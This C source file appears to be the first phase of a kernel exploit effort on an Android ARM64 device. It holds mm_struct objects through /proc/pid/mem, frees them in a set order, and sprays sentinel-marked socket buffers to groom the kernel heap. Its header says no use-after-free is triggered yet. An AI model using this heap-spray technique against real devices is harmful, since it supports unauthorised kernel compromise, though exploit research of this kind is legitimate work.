/*
 * mm_reclaim_probe.c - Aquaman mm_struct reclaim plumbing probe (phase 0).
 *
 * One execution per boot. No UAF, no futex trigger, no cred, no function
 * pointer, no return address, no code write. No persistence, no flash,
 * no eMMC. Failure mode is clean exit, never a panic by construction
 * (no dangling kernel pointer exists in this harness).
 *
 * SIGNAL CLASSIFICATION (do not mix these):
 *  PLUMBING_SIGNAL      = MSG_PEEK returns our own 16K payload bytes
 *                         (P5 plumbing_hits). Proves the unix-skb
 *                         send/peek path works. Says nothing about slabs.
 *  REAL_RECLAIM_SIGNAL  = NONE AVAILABLE to uid2000 on stock here:
 *                         /proc/slabinfo absent (SLABINFO=n), /proc/buddyinfo
 *                         and /sys/kernel/slab/mm_struct attrs denied to shell,
 *                         and this round has no UAF read nor post-foothold
 *                         counters. So P6 reclaim_hits is always 0 and the
 *                         round FAILs by construction until a valid signal
 *                         exists. No new proof mechanism is invented here.
 *  FALSE_POSITIVE_SIGNAL = treating P5 plumbing_hits, buddy deltas, timing,
 *                         errno changes, or absence of crash as reclaim.
 *                         All of those are AUXILIARY or FALSE_POSITIVE,
 *                         never PROOF.
 *
 * What it does:
 *  P0 shape: fork/open(/proc/pid/mem)/kill/wait loop holding mm_struct
 *     via mm_count (proc_mem_open atomic_inc, base.c:801). Counts rescaled
 *     18->19: prep 608, spray 171, pre 18, leak 1, post 19 (=817 fds).
 *  P1 free: close all fds in Hazel order (pre, leak, post, spray, prep).
 *     Each close is mem_release -> mmdrop -> free_mm (fork.c:888-897).
 *     Settle 2s for cpu_partial drain (CONFIG_SLUB_CPU_PARTIAL=y).
 *  P2 spray: up to NPAIRS AF_UNIX SOCK_STREAM socketpairs, SO_SNDBUF=1MB
 *     (clamps to ~212992, still >16384, sock.c:706-718), one 16384B send
 *     each (order-2 attempt-first via alloc_skb_with_frags NOWARN/NORETRY,
 *     skbuff.c:4693-4699; fallback to scattered pages is possible).
 *     Payload: zeros + 0x5A5A5A5A sentinel at 0x3FFC (last word).
 *  P3 check: recv(MSG_PEEK) per socket, test word at 0x3FFC.
 *     Plumbing only, NOT slab-reuse proof (see classification above).
 *  Buddy/slab signal (best-effort): try /proc/buddyinfo + /proc/meminfo
 *     + slabinfo/sysfs presence probes. Denied/absent on stock shell is
 *     the EXPECTED outcome; recorded raw as BLOCKED diagnostic, never
 *     gated as PASS/FAIL.
 *
 * Modes (argv[1]): A|full (default, 817 holds + 512 pairs, principal),
 *  B|fallback (reduced pressure: 20 holds + 16 pairs, used when the
 *  principal cannot reach the desired pressure, e.g. HOLD_BLOCKED or
 *  EMFILE), control (sockets only, no mm shaping, plumbing baseline),
 *  smoke (alias of B).
 *
 * Build (NDK r29, ARM64, API 28, static):
 *   aarch64-linux-android28-clang -O2 -Wall -static mm_reclaim_probe.c -o mm_reclaim_probe
 * Run (one shot per mode, same boot, no reboot expected):
 *   adb push mm_reclaim_probe /data/local/tmp/
 *   adb shell /data/local/tmp/mm_reclaim_probe control
 *   adb shell /data/local/tmp/mm_reclaim_probe A
 *   adb shell /data/local/tmp/mm_reclaim_probe B
 *
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define PAYLOAD 16384
#define SENT_OFF 0x3FFC
#define SENT_WORD 0x5A5A5A5Au
#define MAX_PAIRS 512
#define MAX_HOLDS 820

static int g_holds[MAX_HOLDS];
static int g_nholds;
static int g_sock[MAX_PAIRS][2];
static int g_npairs;
static int g_hold_blocked;   /* EACCES/EPERM on /proc/pid/mem: SELinux/policy */
static int g_hold_other;     /* any other hold failure errno */
static int g_emfile;         /* EMFILE/ENFILE hits (operational, not reclaim) */
static int g_sends_ok;
static pid_t g_first_child = -1, g_last_child = -1;

static uint64_t now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

static void read_boot_id(char *out, size_t n) {
    FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
    if (!f) {
        snprintf(out, n, "unknown");
        return;
    }
    if (!fgets(out, n, f))
        snprintf(out, n, "unknown");
    else
        out[strcspn(out, "\n")] = 0;
    fclose(f);
}

static void dump_buddy(const char *tag) {
    FILE *f = fopen("/proc/buddyinfo", "r");
    char line[512];
    if (!f) {
        printf("P4 BUDDY %s unreadable errno=%d\n", tag, errno);
        return;
    }
    printf("P4 BUDDY %s begin\n", tag);
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\n")] = 0;
        printf("P4 BUDDY %s %.160s\n", tag, line);
    }
    printf("P4 BUDDY %s end\n", tag);
    fclose(f);
}

static void dump_mem_avail(const char *tag) {
    FILE *f = fopen("/proc/meminfo", "r");
    char line[256];
    if (!f) {
        printf("P4 MEM %s unreadable errno=%d\n", tag, errno);
        return;
    }
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "MemTotal:", 9) || !strncmp(line, "MemFree:", 8) ||
            !strncmp(line, "MemAvailable:", 13)) {
            line[strcspn(line, "\n")] = 0;
            printf("P4 MEM %s %s\n", tag, line);
        }
    }
    fclose(f);
}

static void probe_slab_sysfs(void) {
    FILE *f = fopen("/proc/slabinfo", "r");
    printf("P4 SLAB slabinfo=%s\n", f ? "present" : "absent");
    if (f)
        fclose(f);
    f = fopen("/sys/kernel/slab/mm_struct/slab_size", "r");
    printf("P4 SLAB mm_struct_sysfs=%s (unpriv expected denied)\n",
           f ? "readable-UNEXPECTED" : "denied-BLOCKED");
    if (f)
        fclose(f);
}

/* hold one mm via /proc/pid/mem. Returns fd or -1 (errno preserved). */
static int hold_one_mm(void) {
    pid_t pid = fork();
    if (pid < 0)
        return -1;
    if (pid == 0) {
        for (;;)
            pause();
        _exit(0);
    }
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", (int)pid);
    int fd = open(path, O_RDONLY);
    int oe = errno;
    if (g_first_child < 0)
        g_first_child = pid;
    g_last_child = pid;
    kill(pid, SIGKILL);
    waitpid(pid, 0, 0);
    if (fd < 0)
        errno = oe;
    return fd;
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "full";
    int want_prep = 608, want_spray = 171, want_pre = 18, want_post = 19;
    int want_pairs = MAX_PAIRS;

    setbuf(stdout, 0);
    uint64_t t_start = now_ms();
    char boot_id[64];
    read_boot_id(boot_id, sizeof(boot_id));

    if (!strcmp(mode, "control")) {
        want_prep = want_spray = want_pre = want_post = 0;
    } else if (!strcmp(mode, "smoke") || !strcmp(mode, "B") ||
               !strcmp(mode, "fallback") || !strcmp(mode, "modeB")) {
        want_prep = 0; want_spray = 0; want_pre = 10; want_post = 9;
        want_pairs = 16;
        mode = "B-fallback";
    } else if (!strcmp(mode, "A") || !strcmp(mode, "modeA")) {
        mode = "A-full";
    } else {
        mode = "full(A)";
    }

    int want_total = want_prep + want_spray + want_pre + 1 + want_post;
    int attempts = 1; /* one-shot per exec, preserved */
    printf("P0 READY mode=%s boot=%s pid=%d attempts=%d holds_req=%d pairs_req=%d payload=%d sentinel=0x%x@0x%x\n",
           mode, boot_id, (int)getpid(), attempts, want_total, want_pairs,
           PAYLOAD, SENT_WORD, SENT_OFF);

    dump_buddy("before_shape");
    dump_mem_avail("before_shape");
    probe_slab_sysfs();

    /* P0 shape (skipped entirely in control mode). */
    uint64_t t_shape0 = now_ms();
    int shape_errno = 0;
    if (want_total > 0) {
        int order[] = {0, 1, 2, 3, 4}; /* pre, leak, post, spray, prep */
        int counts[5];
        counts[0] = want_pre; counts[1] = 1; counts[2] = want_post;
        counts[3] = want_spray; counts[4] = want_prep;
        (void)order;
        for (int g = 0; g < 5; g++) {
            for (int i = 0; i < counts[g]; i++) {
                if (g_nholds >= MAX_HOLDS)
                    break;
                errno = 0;
                int fd = hold_one_mm();
                if (fd < 0) {
                    shape_errno = errno;
                    if (shape_errno == EACCES || shape_errno == EPERM)
                        g_hold_blocked++;
                    else if (shape_errno == EMFILE || shape_errno == ENFILE)
                        g_emfile++;
                    else
                        g_hold_other++;
                    printf("P1 HOLD_FAIL group=%d idx=%d errno=%d (%s) blocked=%d other=%d emfile=%d\n",
                           g, i, shape_errno, strerror(shape_errno),
                           g_hold_blocked, g_hold_other, g_emfile);
                    for (int k = 0; k < g_nholds; k++)
                        close(g_holds[k]);
                    if (shape_errno == EACCES || shape_errno == EPERM)
                        printf("P6 RESULT=HOLD_BLOCKED mode=%s (exit limpo, sem reclaim)\n", mode);
                    else
                        printf("P6 RESULT=FAIL mode=%s (hold errno=%d, sem reclaim)\n", mode, shape_errno);
                    printf("P7 SUMMARY mode=%s boot=%s pid=%d attempts=%d holds_req=%d holds_ok=%d freed=0 pairs_req=%d pairs_ok=0 sends_ok=0 plumbing_hits=0 reclaim_hits=0 emfile=%d hold_blocked=%d hold_other=%d t_ms=%llu\n",
                           mode, boot_id, (int)getpid(), attempts, want_total, g_nholds,
                           want_pairs, g_emfile, g_hold_blocked, g_hold_other,
                           (unsigned long long)(now_ms() - t_start));
                    printf("P8 END mode=%s (no reboot observed during exec)\n", mode);
                    return 2;
                }
                g_holds[g_nholds++] = fd;
            }
        }
        /* Reorder to Hazel free order: pre, leak, post, spray, prep are
         * already stored in that order above (g=0..4). */
        printf("P1 SHAPED holds=%d (pre=%d leak=1 post=%d spray=%d prep=%d) child_first=%d child_last=%d t_ms=%llu\n",
               g_nholds, want_pre, want_post, want_spray, want_prep,
               (int)g_first_child, (int)g_last_child,
               (unsigned long long)(now_ms() - t_shape0));
    } else {
        printf("P1 SHAPE_SKIPPED control_no_mm\n");
    }

    dump_buddy("after_shape");
    dump_mem_avail("after_shape");

    /* P1 free. */
    int nfreed = g_nholds;
    for (int i = 0; i < g_nholds; i++)
        close(g_holds[i]);
    printf("P2 FREED holds=%d\n", nfreed);
    g_nholds = 0;
    sleep(2); /* cpu_partial drain, CONFIG_SLUB_CPU_PARTIAL=y */
    dump_buddy("after_free");
    dump_mem_avail("after_free");

    /* P2 spray. */
    uint64_t t_spray0 = now_ms();
    static unsigned char *buf;
    buf = malloc(PAYLOAD);
    if (!buf) {
        printf("P0 ABORT malloc failed\n");
        return 3;
    }
    memset(buf, 0, PAYLOAD);
    *(uint32_t *)(buf + SENT_OFF) = SENT_WORD;

    int spray_errno = 0;
    for (int i = 0; i < want_pairs; i++) {
        int sv[2] = {-1, -1};
        errno = 0;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv)) {
            spray_errno = errno;
            if (spray_errno == EMFILE || spray_errno == ENFILE)
                g_emfile++;
            printf("P3 SOCKET_STOP pairs=%d errno=%d (%s) emfile=%d\n",
                   g_npairs, spray_errno, strerror(spray_errno), g_emfile);
            break; /* recycle: keep existing pairs, stop allocating */
        }
        int snd = 1024 * 1024;
        setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        errno = 0;
        ssize_t w = send(sv[0], buf, PAYLOAD, MSG_NOSIGNAL);
        if (w != PAYLOAD) {
            spray_errno = errno;
            if (spray_errno == EMFILE || spray_errno == ENFILE)
                g_emfile++;
            printf("P3 SEND_SHORT pair=%d w=%zd errno=%d emfile=%d\n",
                   i, w, spray_errno, g_emfile);
            close(sv[0]); close(sv[1]);
            continue;
        }
        g_sock[g_npairs][0] = sv[0];
        g_sock[g_npairs][1] = sv[1];
        g_npairs++;
        g_sends_ok++;
    }
    printf("P3 SPRAYED pairs=%d sends_ok=%d spray_errno=%d t_ms=%llu\n",
           g_npairs, g_sends_ok, spray_errno,
           (unsigned long long)(now_ms() - t_spray0));
    dump_buddy("after_spray");
    dump_mem_avail("after_spray");

    /* P5 check via MSG_PEEK: PLUMBING_SIGNAL only, never reclaim proof. */
    uint64_t t_peek0 = now_ms();
    static unsigned char *rb;
    rb = malloc(PAYLOAD);
    if (!rb) {
        printf("P0 ABORT malloc2 failed\n");
        return 3;
    }
    int plumbing_hits = 0, first = -1;
    for (int i = 0; i < g_npairs; i++) {
        errno = 0;
        ssize_t r = recv(g_sock[i][1], rb, PAYLOAD, MSG_PEEK | MSG_WAITALL);
        if (r != PAYLOAD)
            continue;
        if (*(uint32_t *)(rb + SENT_OFF) == SENT_WORD) {
            if (first < 0)
                first = i;
            plumbing_hits++;
        }
    }
    printf("P5 PEEK plumbing_hits=%d/%d first=%d t_ms=%llu (PLUMBING_SIGNAL, not reclaim)\n",
           plumbing_hits, g_npairs, first,
           (unsigned long long)(now_ms() - t_peek0));
    for (int i = 0; i < g_npairs; i++) {
        close(g_sock[i][0]); close(g_sock[i][1]);
    }
    free(buf); free(rb);

    /* P6 reclaim verdict: no valid signal exists unpriv this round, so 0. */
    printf("P6 RECLAIM reclaim_hits=0 (REAL_RECLAIM_SIGNAL unavailable: slabinfo absent, buddy+sysfs denied, no UAF read)\n");
    printf("P6 RESULT=FAIL mode=%s (reclaim_hits=0; plumbing_hits=%d is NOT reclaim proof)\n",
           mode, plumbing_hits);
    printf("P7 SUMMARY mode=%s boot=%s pid=%d attempts=%d holds_req=%d holds_ok=%d freed=%d pairs_req=%d pairs_ok=%d sends_ok=%d pressure_obj=%dB plumbing_hits=%d reclaim_hits=0 emfile=%d hold_blocked=%d hold_other=%d t_ms=%llu\n",
           mode, boot_id, (int)getpid(), attempts, want_total, nfreed, nfreed,
           want_pairs, g_npairs, g_sends_ok, PAYLOAD, plumbing_hits,
           g_emfile, g_hold_blocked, g_hold_other,
           (unsigned long long)(now_ms() - t_start));
    printf("P8 END mode=%s (no reboot observed during exec)\n", mode);
    return 1;
}
